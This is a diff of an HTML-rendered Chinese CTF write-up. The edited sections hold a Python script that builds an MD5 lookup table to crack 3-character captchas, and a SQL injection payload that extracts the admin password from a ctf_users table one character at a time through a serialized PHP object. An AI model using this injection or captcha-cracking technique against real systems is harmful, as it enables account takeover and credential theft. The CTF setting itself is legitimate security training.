@@ -3772,14 +3772,22 @@ $ cat reports/127.0.0.1/19-08-24_11-26-18 <span class="p">|</span> grep <span cl
 </td></tr></table>
 
 <h3 id="_3">生成字典<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
-<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
-2
-3
-4
-5
-6
-7
-8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_code_dict</span><span class="p">():</span>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
+
+<span class="k">def</span> <span class="nf">get_code_dict</span><span class="p">():</span>
     <span class="n">c</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []{}&lt;&gt;~`+=,.;:/?|&#39;</span>
     <span class="n">captchas</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">product</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">3</span><span class="p">)]</span>
 
@@ -3787,6 +3795,8 @@ $ cat reports/127.0.0.1/19-08-24_11-26-18 <span class="p">|</span> grep <span cl
     <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;captchas.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
         <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">captchas</span><span class="p">:</span>
             <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">k</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">+</span><span class="s1">&#39; --&gt; &#39;</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">get_code_dict</span><span class="p">()</span>
 </pre></div>
 </td></tr></table>
 
@@ -3930,11 +3940,11 @@ $ cat reports/127.0.0.1/19-08-24_11-26-18 <span class="p">|</span> grep <span cl
 
 <span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
 
-<span class="o">//</span> <span class="mf">1.</span> <span class="err">使用</span> <span class="err">`</span><span class="p">,</span> <span class="err">截断</span> <span class="n">signature</span>
-<span class="o">//</span> <span class="mf">2.</span> <span class="err">在</span> <span class="n">ctf_users</span> <span class="err">表中查出</span> <span class="n">is_admin</span><span class="o">=</span><span class="mi">1</span> <span class="err">的</span> <span class="n">password</span>
-<span class="o">//</span> <span class="mf">3.</span> <span class="err">使用</span> <span class="n">substr</span><span class="p">()</span> <span class="err">每次取一个字符</span><span class="p">,</span> <span class="err">使用</span> <span class="nb">ord</span><span class="p">()</span> <span class="err">返回字符的</span><span class="n">ASCII码</span>
-<span class="o">//</span> <span class="mf">4.</span> <span class="err">使用</span> <span class="n">concat</span><span class="p">()</span> <span class="err">拼接为序列化后的</span> <span class="n">Mood</span>
-<span class="o">//</span> <span class="mf">5.</span> <span class="err">使用</span> <span class="o">--</span> <span class="err">截断后面的</span><span class="n">SQL语句</span>
+<span class="c1"># 1. 使用 `, 截断 signature</span>
+<span class="c1"># 2. 在 ctf_users 表中查出 is_admin=1 的 password</span>
+<span class="c1"># 3. 使用 substr() 每次取一个字符, 使用 ord() 返回字符的ASCII码</span>
+<span class="c1"># 4. 使用 concat() 拼接为序列化后的 Mood</span>
+<span class="c1"># 5. 使用 -- 截断后面的SQL语句</span>
 <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
 <span class="n">mood</span> <span class="o">=</span> <span class="s1">&#39;(select concat(`O:4:</span><span class="se">\&quot;</span><span class="s1">Mood</span><span class="se">\&quot;</span><span class="s1">:3:{{s:4:</span><span class="se">\&quot;</span><span class="s1">mood</span><span class="se">\&quot;</span><span class="s1">;i:`,ord(substr(password,{},1)),`;s:2:</span><span class="se">\&quot;</span><span class="s1">ip</span><span class="se">\&quot;</span><span class="s1">;s:14:</span><span class="se">\&quot;</span><span class="s1">80.212.199.161</span><span class="se">\&quot;</span><span class="s1">;s:4:</span><span class="se">\&quot;</span><span class="s1">date</span><span class="se">\&quot;</span><span class="s1">;i:1520664478;}}`) from ctf_users where is_admin=1 limit 1)&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a`, {}); -- -&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">mood</span><span class="p">)</span>
